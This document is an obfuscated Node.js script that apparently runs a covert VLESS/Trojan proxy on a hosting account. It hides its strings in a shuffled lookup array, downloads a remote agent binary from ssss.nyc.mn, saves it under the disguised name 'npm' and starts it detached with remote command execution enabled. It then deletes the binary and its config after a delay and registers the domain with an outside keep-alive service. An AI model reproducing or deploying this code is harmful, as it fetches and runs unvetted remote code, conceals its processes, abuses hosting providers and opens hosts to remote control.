const _0x4e8c=['length','get','index.html','--tls','post','error','&path=%2F','path','finish',':443?security=tls&sni=','client_secret:\x20','url','NEZHA_SERVER','https://dns.google/resolve?name=','axios','Not\x20Found\x0a','readFile','includes','/bin/bash','Hello\x20world!','test','connect','https://speed.cloudflare.com/meta','https://amd64.ssss.nyc.mn/v1','connection','PORT','npm\x20is\x20already\x20running,\x20skip\x20running...','data','sha224','unlink','npm\x20running\x20error:','https://amd64.ssss.nyc.mn/agent','end','application/json','pop','write','config.yaml','asOrganization','error:\x20','https://arm64.ssss.nyc.mn/agent','writeFileSync','&fp=chrome&type=ws&host=','false','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','NAME','true','UUID','arm','child_process','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','update','https://arm64.ssss.nyc.mn/v1','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','\x20with\x20all\x20DNS\x20servers','trim','Hug','readUInt16BE','&type=A','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','1234.abc.com','log','Answer','every','slice','toString','env','join','2083','type','Server','text/html','crypto','readUInt8','send','createWriteStream',':443?encryption=none&security=tls&sni=','pipe','NEZHA_KEY','http','writeHead','replace','hex','SUB_PATH','1.1.1.1','reduce','map','createHash','443','2053','from'];const _0x5aff=function(_0x4e8c0d,_0x5aff2e){_0x4e8c0d=_0x4e8c0d-0x0;let _0x161c03=_0x4e8c[_0x4e8c0d];return _0x161c03;};const os=require('os');const http=require(_0x5aff('0x4f'));const fs=require('fs');const axios=require(_0x5aff('0xe'));const net=require('net');const path=require(_0x5aff('0x7'));const crypto=require(_0x5aff('0x48'));const {Buffer}=require('buffer');const {exec,execSync}=require(_0x5aff('0x30'));const {WebSocket,createWebSocketStream}=require('ws');const UUID=process['env'][_0x5aff('0x2e')]||'f1f284ce-32a1-47be-a340-8b41f5cba71a';const NEZHA_SERVER=process[_0x5aff('0x42')][_0x5aff('0xc')]||'';const NEZHA_PORT=process['env']['NEZHA_PORT']||'';const NEZHA_KEY=process[_0x5aff('0x42')][_0x5aff('0x4e')]||'';const DOMAIN=process['env']['DOMAIN']||_0x5aff('0x3c');const AUTO_ACCESS=process[_0x5aff('0x42')]['AUTO_ACCESS']||!![];const WSPATH=process['env']['WSPATH']||UUID['slice'](0x0,0x8);const SUB_PATH=process['env'][_0x5aff('0x53')]||'sub';const NAME=process['env'][_0x5aff('0x2c')]||_0x5aff('0x38');const PORT=process[_0x5aff('0x42')][_0x5aff('0x19')]||0x1eb4;let ISP='';const GetISP=async()=>{try{const _0x2dd741=await axios[_0x5aff('0x1')](_0x5aff('0x16'));const _0x115f33=_0x2dd741[_0x5aff('0x1b')];ISP=(_0x115f33['country']+'-'+_0x115f33[_0x5aff('0x25')])['replace'](/ /g,'_');}catch(_0x22b16a){ISP='Unknown';}};GetISP();const httpServer=http['createServer']((_0x242f82,_0x26ba88)=>{if(_0x242f82['url']==='/'){const _0x4a1c64=path['join'](__dirname,_0x5aff('0x2'));fs[_0x5aff('0x10')](_0x4a1c64,'utf8',(_0x51b2d1,_0x502253)=>{if(_0x51b2d1){_0x26ba88[_0x5aff('0x50')](0xc8,{'Content-Type':_0x5aff('0x47')});_0x26ba88[_0x5aff('0x20')](_0x5aff('0x13'));return;}_0x26ba88[_0x5aff('0x50')](0xc8,{'Content-Type':'text/html'});_0x26ba88['end'](_0x502253);});return;}else if(_0x242f82[_0x5aff('0xb')]==='/'+SUB_PATH){const _0x91a431='vless://'+UUID+'@'+DOMAIN+_0x5aff('0x4c')+DOMAIN+_0x5aff('0x29')+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP;const _0x3a9282='trojan://'+UUID+'@'+DOMAIN+_0x5aff('0x9')+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x5aff('0x6')+WSPATH+'#'+NAME+'-'+ISP;const _0x4dbc06=_0x91a431+'\x0a'+_0x3a9282;const _0x112367=Buffer[_0x5aff('0x5a')](_0x4dbc06)['toString']('base64');_0x26ba88[_0x5aff('0x50')](0xc8,{'Content-Type':'text/plain'});_0x26ba88['end'](_0x112367+'\x0a');}else{_0x26ba88[_0x5aff('0x50')](0x194,{'Content-Type':'text/plain'});_0x26ba88[_0x5aff('0x20')](_0x5aff('0xf'));}});const wss=new WebSocket[(_0x5aff('0x46'))]({'server':httpServer});const uuid=UUID[_0x5aff('0x51')](/-/g,'');const DNS_SERVERS=['8.8.4.4',_0x5aff('0x54')];function resolveHost(_0x1b9dc8){return new Promise((_0x55da29,_0x439a48)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x5aff('0x14')](_0x1b9dc8)){_0x55da29(_0x1b9dc8);return;}let _0x4f32da=0x0;function _0x501776(){if(_0x4f32da>=DNS_SERVERS[_0x5aff('0x0')]){_0x439a48(new Error('Failed\x20to\x20resolve\x20'+_0x1b9dc8+_0x5aff('0x36')));return;}const _0x10f4e5=DNS_SERVERS[_0x4f32da];_0x4f32da++;const _0x2dfa8f=_0x5aff('0xd')+encodeURIComponent(_0x1b9dc8)+_0x5aff('0x3a');axios[_0x5aff('0x1')](_0x2dfa8f,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})['then'](_0x329c58=>{const _0x42e9ba=_0x329c58[_0x5aff('0x1b')];if(_0x42e9ba['Status']===0x0&&_0x42e9ba['Answer']&&_0x42e9ba[_0x5aff('0x3e')]['length']>0x0){const _0x44da17=_0x42e9ba[_0x5aff('0x3e')]['find'](_0x30bc84=>_0x30bc84[_0x5aff('0x45')]===0x1);if(_0x44da17){_0x55da29(_0x44da17[_0x5aff('0x1b')]);return;}}_0x501776();})['catch'](_0x3fabba=>{_0x501776();});}_0x501776();});}function handleVlessConnection(_0x4e91c1,_0x304258){const [_0x33e8a7]=_0x304258;const _0x3ba7bd=_0x304258['slice'](0x1,0x11);if(!_0x3ba7bd['every']((_0x462764,_0x11a518)=>_0x462764==parseInt(uuid['substr'](_0x11a518*0x2,0x2),0x10)))return![];let _0x101ee8=_0x304258[_0x5aff('0x40')](0x11,0x12)['readUInt8']()+0x13;const _0x4cb5da=_0x304258['slice'](_0x101ee8,_0x101ee8+=0x2)[_0x5aff('0x39')](0x0);const _0x48795d=_0x304258['slice'](_0x101ee8,_0x101ee8+=0x1)['readUInt8']();const _0x4572ce=_0x48795d==0x1?_0x304258['slice'](_0x101ee8,_0x101ee8+=0x4)[_0x5aff('0x43')]('.'):_0x48795d==0x2?new TextDecoder()['decode'](_0x304258['slice'](_0x101ee8+0x1,_0x101ee8+=0x1+_0x304258['slice'](_0x101ee8,_0x101ee8+0x1)[_0x5aff('0x49')]())):_0x48795d==0x3?_0x304258['slice'](_0x101ee8,_0x101ee8+=0x10)['reduce']((_0x3ad5e6,_0x54254b,_0x1a625d,_0x1a79d6)=>_0x1a625d%0x2?_0x3ad5e6['concat'](_0x1a79d6['slice'](_0x1a625d-0x1,_0x1a625d+0x1)):_0x3ad5e6,[])[_0x5aff('0x56')](_0x6dfae6=>_0x6dfae6['readUInt16BE'](0x0)['toString'](0x10))['join'](':'):'';_0x4e91c1[_0x5aff('0x4a')](new Uint8Array([_0x33e8a7,0x0]));const _0x1cb967=createWebSocketStream(_0x4e91c1);resolveHost(_0x4572ce)['then'](_0x51b69d=>{net[_0x5aff('0x15')]({'host':_0x51b69d,'port':_0x4cb5da},function(){this[_0x5aff('0x23')](_0x304258['slice'](_0x101ee8));_0x1cb967['on']('error',()=>{})['pipe'](this)['on'](_0x5aff('0x5'),()=>{})['pipe'](_0x1cb967);})['on']('error',()=>{});})['catch'](_0x556284=>{net['connect']({'host':_0x4572ce,'port':_0x4cb5da},function(){this['write'](_0x304258[_0x5aff('0x40')](_0x101ee8));_0x1cb967['on']('error',()=>{})[_0x5aff('0x4d')](this)['on'](_0x5aff('0x5'),()=>{})['pipe'](_0x1cb967);})['on']('error',()=>{});});return!![];}function handleTrojanConnection(_0x1249e6,_0x1720ac){try{if(_0x1720ac['length']<0x3a)return![];const _0x15e631=_0x1720ac['slice'](0x0,0x38)[_0x5aff('0x41')]();const _0x91f5d6=[UUID];let _0x338dfd=null;for(const _0x2316b2 of _0x91f5d6){const _0x458613=crypto[_0x5aff('0x57')](_0x5aff('0x1c'))[_0x5aff('0x32')](_0x2316b2)['digest'](_0x5aff('0x52'));if(_0x458613===_0x15e631){_0x338dfd=_0x2316b2;break;}}if(!_0x338dfd)return![];let _0xed20c7=0x38;if(_0x1720ac[_0xed20c7]===0xd&&_0x1720ac[_0xed20c7+0x1]===0xa){_0xed20c7+=0x2;}const _0xbec9c=_0x1720ac[_0xed20c7];if(_0xbec9c!==0x1)return![];_0xed20c7+=0x1;const _0x55ea55=_0x1720ac[_0xed20c7];_0xed20c7+=0x1;let _0x44f202,_0x44c7de;if(_0x55ea55===0x1){_0x44f202=_0x1720ac['slice'](_0xed20c7,_0xed20c7+0x4)[_0x5aff('0x43')]('.');_0xed20c7+=0x4;}else if(_0x55ea55===0x3){const _0x224c1b=_0x1720ac[_0xed20c7];_0xed20c7+=0x1;_0x44f202=_0x1720ac[_0x5aff('0x40')](_0xed20c7,_0xed20c7+_0x224c1b)[_0x5aff('0x41')]();_0xed20c7+=_0x224c1b;}else if(_0x55ea55===0x4){_0x44f202=_0x1720ac[_0x5aff('0x40')](_0xed20c7,_0xed20c7+0x10)[_0x5aff('0x55')]((_0x3b85d9,_0x3795db,_0x528a9b,_0x2621a2)=>_0x528a9b%0x2?_0x3b85d9['concat'](_0x2621a2[_0x5aff('0x40')](_0x528a9b-0x1,_0x528a9b+0x1)):_0x3b85d9,[])[_0x5aff('0x56')](_0x2248cf=>_0x2248cf['readUInt16BE'](0x0)[_0x5aff('0x41')](0x10))[_0x5aff('0x43')](':');_0xed20c7+=0x10;}else{return![];}_0x44c7de=_0x1720ac['readUInt16BE'](_0xed20c7);_0xed20c7+=0x2;if(_0xed20c7<_0x1720ac[_0x5aff('0x0')]&&_0x1720ac[_0xed20c7]===0xd&&_0x1720ac[_0xed20c7+0x1]===0xa){_0xed20c7+=0x2;}const _0x1996aa=createWebSocketStream(_0x1249e6);resolveHost(_0x44f202)['then'](_0x5c384c=>{net['connect']({'host':_0x5c384c,'port':_0x44c7de},function(){if(_0xed20c7<_0x1720ac['length']){this['write'](_0x1720ac['slice'](_0xed20c7));}_0x1996aa['on'](_0x5aff('0x5'),()=>{})['pipe'](this)['on']('error',()=>{})[_0x5aff('0x4d')](_0x1996aa);})['on'](_0x5aff('0x5'),()=>{});})['catch'](_0x549c95=>{net['connect']({'host':_0x44f202,'port':_0x44c7de},function(){if(_0xed20c7<_0x1720ac[_0x5aff('0x0')]){this[_0x5aff('0x23')](_0x1720ac['slice'](_0xed20c7));}_0x1996aa['on']('error',()=>{})[_0x5aff('0x4d')](this)['on'](_0x5aff('0x5'),()=>{})['pipe'](_0x1996aa);})['on'](_0x5aff('0x5'),()=>{});});return!![];}catch(_0x4a0c21){return![];}}wss['on'](_0x5aff('0x18'),(_0x2ec585,_0xf4045f)=>{const _0x5a7880=_0xf4045f[_0x5aff('0xb')]||'';_0x2ec585['once']('message',_0x11d80a=>{if(_0x11d80a[_0x5aff('0x0')]>0x11&&_0x11d80a[0x0]===0x0){const _0x47e720=_0x11d80a[_0x5aff('0x40')](0x1,0x11);const _0x3da24e=_0x47e720[_0x5aff('0x3f')]((_0x14b4f3,_0x4dd346)=>_0x14b4f3==parseInt(uuid['substr'](_0x4dd346*0x2,0x2),0x10));if(_0x3da24e){if(!handleVlessConnection(_0x2ec585,_0x11d80a)){_0x2ec585['close']();}return;}}if(!handleTrojanConnection(_0x2ec585,_0x11d80a)){_0x2ec585['close']();}})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x516851=os['arch']();if(_0x516851===_0x5aff('0x2f')||_0x516851==='arm64'||_0x516851==='aarch64'){if(!NEZHA_PORT){return _0x5aff('0x33');}else{return _0x5aff('0x27');}}else{if(!NEZHA_PORT){return _0x5aff('0x17');}else{return _0x5aff('0x1f');}}};const downloadFile=async()=>{if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x2bfba5=getDownloadUrl();const _0x5149dd=await axios({'method':_0x5aff('0x1'),'url':_0x2bfba5,'responseType':'stream'});const _0x13cb50=fs[_0x5aff('0x4b')]('npm');_0x5149dd['data'][_0x5aff('0x4d')](_0x13cb50);return new Promise((_0x687cbb,_0x57b0e2)=>{_0x13cb50['on'](_0x5aff('0x8'),()=>{console['log']('npm\x20download\x20successfully');exec('chmod\x20+x\x20npm',_0x10e926=>{if(_0x10e926)_0x57b0e2(_0x10e926);_0x687cbb();});});_0x13cb50['on'](_0x5aff('0x5'),_0x57b0e2);});}catch(_0x4158e8){throw _0x4158e8;}};const runnz=async()=>{try{const _0x367b0c=execSync(_0x5aff('0x34'),{'encoding':'utf-8'});if(_0x367b0c[_0x5aff('0x37')]()!==''){console['log'](_0x5aff('0x1a'));return;}}catch(_0x1ccd22){}await downloadFile();let _0x23d113='';let _0x4267e0=[_0x5aff('0x58'),'8443','2096','2087',_0x5aff('0x44'),_0x5aff('0x59')];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x3554db=_0x4267e0['includes'](NEZHA_PORT)?_0x5aff('0x3'):'';_0x23d113='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x3554db+_0x5aff('0x31');}else if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5934e4=NEZHA_SERVER[_0x5aff('0x11')](':')?NEZHA_SERVER['split'](':')[_0x5aff('0x22')]():'';const _0x4ae4ed=_0x4267e0[_0x5aff('0x11')](_0x5934e4)?_0x5aff('0x2d'):_0x5aff('0x2a');const _0xacab44=_0x5aff('0xa')+NEZHA_KEY+_0x5aff('0x2b')+NEZHA_SERVER+_0x5aff('0x35')+_0x4ae4ed+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x5aff('0x28')]('config.yaml',_0xacab44);}_0x23d113=_0x5aff('0x3b');}else{console['log']('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}try{exec(_0x23d113,{'shell':_0x5aff('0x12')},_0x3bdb04=>{if(_0x3bdb04)console[_0x5aff('0x5')](_0x5aff('0x1e'),_0x3bdb04);else console[_0x5aff('0x3d')]('npm\x20is\x20running');});}catch(_0x14c541){console[_0x5aff('0x5')](_0x5aff('0x26')+_0x14c541);}};async function addAccessTask(){if(!AUTO_ACCESS)return;if(!DOMAIN){return;}const _0x1ce078='https://'+DOMAIN;try{const _0x48ed53=await axios[_0x5aff('0x4')]('https://oooo.serv00.net/add-url',{'url':_0x1ce078},{'headers':{'Content-Type':_0x5aff('0x21')}});console['log']('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x94da83){}}const delFiles=()=>{fs['unlink']('npm',()=>{});fs[_0x5aff('0x1d')](_0x5aff('0x24'),()=>{});};httpServer['listen'](PORT,()=>{runnz();setTimeout(()=>{delFiles();},0x2bf20);addAccessTask();console[_0x5aff('0x3d')]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
